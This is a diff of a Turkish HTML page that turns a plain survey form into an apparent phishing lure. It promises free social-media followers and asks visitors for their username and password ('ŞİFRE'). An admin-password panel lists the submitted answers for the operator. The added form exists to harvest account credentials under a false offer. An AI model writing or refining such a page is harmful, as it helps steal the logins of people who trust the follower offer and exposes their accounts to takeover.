@@ -17,39 +17,39 @@
         <div id="hamburger">&#9776;</div>
         <div id="menu" style="display: none;">
             <ul>
-                <li onclick="showEren()">Eren</li>
-                <li onclick="showCevapLogin()">Cevaplar</li>
+                <li onclick="showTakipçi()">Takipçi</li>
+                <li onclick="showAdminLogin()">Admin</li>
             </ul>
         </div>
 
-        <div id="eren-panel" style="display: none;">
+        <div id="Takipçi-panel" style="display: none;">
             <h2 class="center-text">HOŞGELDİNİZ</h2>
             <form id="anketForm" onsubmit="return saveForm();">
                 <div class="form-section">
-                    <label>CAN</label><br>
-                    <textarea name="can" rows="3" cols="30" required></textarea>
+                    <label>KULLANICI ADI ?I</label><br>
+                    <textarea name="KULLANICI ADI ?" rows="3" cols="30" required></textarea>
                 </div>
                 <div class="form-section">
-                    <label>MEMO</label><br>
-                    <textarea name="memo" rows="3" cols="30" required></textarea>
+                    <label>ŞİFRE ?</label><br>
+                    <textarea name="ŞİFRE ?" rows="3" cols="30" required></textarea>
                 </div>
                 <div class="form-section">
-                    <label>Seçim</label><br>
-                    <input type="radio" name="secim" value="100" required> 100<br>
-                    <input type="radio" name="secim" value="1000"> 1000<br>
-                    <input type="radio" name="secim" value="2500"> 2500<br>
+                    <label>KAÇ TAKİPÇİ İSTERSİNİZ ?</label><br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTRSİNİZ ?" value="100" required> 100<br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTERSİNİZ ?" value="1000"> 1000<br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTERSİNİZ ?" value="2500"> 2500<br>
                 </div>
-                <button type="submit">Gönder</button>
+                <button type="submit">TAKİPÇİYİ GÖNDER</button>
             </form>
         </div>
 
         <div id="cevap-login" style="display:none;">
-            <h3>Cevaplara Giriş</h3>
+            <h3>Admin Giriş</h3>
             <input type="password" id="cevap-password" placeholder="Şifre">
-            <button onclick="checkCevapPassword()">Giriş</button>
+            <button onclick="checkAdminPassword()">Giriş</button>
         </div>
 
-        <div id="cevaplar-panel" style="display: none;">
+        <div id="Admin-panel" style="display: none;">
             <h2>Gelen Cevaplar</h2>
             <div id="cevaplar-listesi"></div>
         </div>
